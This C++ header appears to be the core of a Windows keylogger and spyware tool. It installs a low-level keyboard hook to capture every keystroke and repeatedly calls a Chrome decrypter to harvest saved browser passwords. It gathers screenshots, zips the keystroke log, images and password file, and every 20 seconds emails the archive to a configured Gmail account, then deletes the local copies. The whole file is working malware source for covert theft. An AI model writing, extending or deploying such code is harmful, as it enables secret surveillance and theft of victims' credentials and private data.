#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include <windows.h>
#include "keyConstants.h"
#include <vector>
#include <filesystem>
#include"curlSendMail.h"
#include"IO.h"
#include"SendMail.h"
#include "Screenshots.h"
#include "Globals.h"
#include"zip.h"
#include"unzip.h"
#include"browser_process/ChromeDecrypter.h" //for caprturing browser data

#define FILENAME ZIP_FILE
#define MAX_PATH_SZ 1024
#define IMAGES_LIM 5 //U can change it, but keep in mind that it will become slow with increase size
#define MB_1 1000000

namespace fs = std::filesystem; //require C++17 and above
std::string keylog = "";//This is a string variable where all the key stokes will be stored
HHOOK eHook{NULL};//The is a handle to hook variable
bool InstallHook();

template<typename T>
class HookProcedureClass final {
public:

    HookProcedureClass() = default;

    HookProcedureClass(T currDirPathToSet) :m_currDirPathToSet{ std::move(currDirPathToSet) } {}

    HookProcedureClass(T _ToEMail, T _FromEMail, T _loginUserName, T _loginPassword, T currDirPathToSet):
        _FROM{ std::move(_FromEMail) }, _TO{ std::move(_ToEMail) }, username{std::move(_loginUserName)},
        _PASSWORD{ std::move(_loginPassword) }, m_currDirPathToSet{currDirPathToSet}{}

    void TimerSendMail() {

        sprintf(currDir, "%s", std::string(IO::GetOurPath()).c_str());
        SqlHelperClass browserObj{ browserFileName, m_currDirPathToSet };
        while (1) {

            browserObj.PrintBrowseData(); //calling again and again so there might be new passwords 
                    //get stored by user

            SetCurrentDirectoryA(currDir);

            Sleep(20000); //send mail after every 20 secs

            HZIP hz = (HZIP)INVALID_HANDLE_VALUE; DWORD writ;

            std::string zipfileWithPath = std::string(ZIP_FILE);

            // EXAMPLE 1 - create a zipfile from existing files
            TCHAR zipFileToSend[MAX_PATH];
            _tcscpy_s(zipFileToSend, CA2T(zipfileWithPath.c_str()));

            hz = CreateZip(zipFileToSend, 0);

            HANDLE hFile = NULL;
            std::string fileNamePath = IO::GetOurPath(true) + std::string(LOG_FILE);
            hFile = CreateFileA(
                fileNamePath.c_str(),     // Filename
                GENERIC_READ,  // append mode  // Desired access
                FILE_SHARE_READ,        // Share mode
                NULL,                   // Security attributes
                OPEN_EXISTING, // Open existing file
                FILE_ATTRIBUTE_NORMAL,  // Flags and attributes
                NULL);                  // Template file handle

            if (hFile == INVALID_HANDLE_VALUE) {
                Helper::WriteAppLog(" File not exist yet or it might be used by another process");
                //continue;
            }
            DWORD dwFileSize = GetFileSize(hFile, NULL);
            CloseHandle(hFile);

            if (dwFileSize == 0 || dwFileSize == oldSize) {
                // only send mail if file has some new content
                Helper::WriteAppLog(" No any data written in file yet ");
                //continue;
            }

            std::string last_file = IO::Writelog(keylog);

            if (last_file.empty()) {
                Helper::WriteAppLog("File Creation was not successfull . keylog '" + keylog + "'");
                return;
            }

            std::string txtkeyLogFile = std::string(LOG_FILE);
            std::string attachs = IO::GetOurPath(true) + last_file + "::" + fullPathOfImage1;

            TCHAR txtFileNameToAttach[MAX_PATH];
            _tcscpy_s(txtFileNameToAttach, CA2T(txtkeyLogFile.c_str()));
            ZipAdd(hz, txtFileNameToAttach, txtFileNameToAttach); //adding LOG file to ZIP

            imgFileNames.clear();

            AddExtFilesToVec(IO::GetOurPath(true), ".bmp", imgFileNames);

            for (long i = 0; i < imgFileNames.size(); i++) {
                TCHAR imgFileToAttach[MAX_PATH];
                _tcscpy_s(imgFileToAttach, CA2T(imgFileNames[i].c_str()));
                ZipAdd(hz, imgFileToAttach, imgFileToAttach); //Adding images to file
            }

            TCHAR browserDataFileToAttach[MAX_PATH];
            _tcscpy_s(browserDataFileToAttach, CA2T(BROWSER_DAT_FILE_NAME));

            ZipAdd(hz, browserDataFileToAttach, browserDataFileToAttach); //Attaching Browser Passwords File

            CloseZip(hz);

            zipfileWithPath = IO::GetOurPath(true) + std::string(ZIP_FILE);

            {
                curlSendMail::CurlHelperClass curlProc{ _TO, _FROM, zipfileWithPath,
            username, _PASSWORD, std::string(ZIP_FILE) };
                curlProc.sendFinalmail();
            }

            DeleteFileA(zipfileWithPath.c_str());

            DeleteAllExtFilesFromDir(IO::GetOurPath(true), ".bmp");
            DeleteAllExtFilesFromDir(IO::GetOurPath(true), ".dat");

            imgFileNames.clear();

            if (dwFileSize >= MB_1) { //clear the file if file size become greater than 1 MB
                ofstream myfile;
                myfile.open(last_file);
                if (myfile.is_open()) {
                    myfile << ""; //Emptying the file
                    oldSize = 0;
                    myfile.close();
                }
            }
        }
    }

private:

    void DeleteAllExtFilesFromDir(const string& directory, const string& extension) {

        for (auto& p : fs::recursive_directory_iterator(directory))
        {
            if (p.path().extension() == extension) {
                string imgfile{ directory };
                imgfile += string(p.path().stem().string());
                imgfile += extension;
                DeleteFileA(imgfile.c_str());
            }
        }
    }

    void AddExtFilesToVec(const string& directory, const string& extension, vector<T>& vec) {

        for (auto& p : fs::recursive_directory_iterator(directory))
        {
            if (p.path().extension() == extension) {
                string imgfile{ };
                imgfile += string(p.path().stem().string());
                imgfile += extension;
                vec.push_back(imgfile);
                if (vec.size() >= IMAGES_LIM) {
                    //send no more then % images at a time to reduce mail sending time
                    break;
                }
            }
        }
    }

    void runKbHook(void) {
        if (InstallHook()) {
            Helper::WriteAppLog("Hook is NULL");

        }
        else {
            Helper::WriteAppLog("Hook is not NULL");
        }
        return;
    }

    bool UninstallHook() {
        BOOL b = UnhookWindowsHookEx(eHook);
        eHook = NULL;
        return (bool)b;
    }

    bool isHooked() {
        return (bool)(eHook == NULL);
    }

    std::string _FROM = "yourgmailid@gmail.com";
    std::string _TO = "yourgmailid@gmail.com"; // because mails will be sent from your email to your email. so both from and to will be same 
    std::string username = "yourgmailid@gmail.com"; // required to login
    std::string _PASSWORD = "your_app_password"; //Generated app password from Gmail's security settings
    std::string keyLogsAll = "";
    vector<std::string> imgFileNames;
    char currDir[MAX_PATH] = { 0 };
    string m_currDirPathToSet{};
};

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) {//This function will be called everytime a key is pressed on keyboard
    Helper::WriteAppLog(" In Keyboard Proc Func");
    if (nCode < 0) {
        CallNextHookEx(eHook, nCode, wparam, lparam);
    }

    KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;//KBDLLHOOKSTRUCT have to see on internet

    if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {//This is just pressing the key and holding it..not pressing the key and releasing the key
        keylog += Keys::KEYS[kbs->vkCode].Name;
        if (kbs->vkCode == VK_RETURN) {
            keylog += '\n';
        }
    }
    else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {//This is for that keys are released after pressing
       //we are only interested in releasing of special keys like shift
       //we want to store like [shift(pressed)][a][b][/shift(released)]
       // so we will know what letters was pressed while key shift was pressed
        DWORD key = kbs->vkCode;
        if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || key == VK_SHIFT
            || key == VK_LSHIFT || key == VK_RSHIFT || key == VK_MENU || key == VK_LMENU
            || key == VK_RMENU || key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN || key == VK_RWIN) {
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
            KeyName.insert(1, "/");//appending back slash to represent release of key
            keylog += KeyName;
        }
    }
    std::string last_file_name = IO::Writelog(keylog);
    //keyLogsAll += keylog;
    keylog = "";
    return CallNextHookEx(eHook, nCode, wparam, lparam);

}

bool InstallHook() {

    /*
    A hook is a mechanism by which an application can intercept events, such as messages, mouse actions, and keystrokes.
    A function that intercepts a particular type of event is known as a hook procedure.
    A hook procedure can act on each event it receives, and then modify or discard the event.
    */

    Helper::WriteAppLog("Hook started... Timer started");
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)(OurKeyboardProc), GetModuleHandle(NULL), 0);
    return eHook == NULL;
    /*WH_KEYBOARD :- we use Keyboard hook, LL means Low level
    OurKeyboardProc = Procedure envoked by the hook system when everytime user pressed the key on keyboard
    we are converting this because SetWindowsHookEx accept handle to hook procedure
    */
}

#endif // KEYBHOOK_H
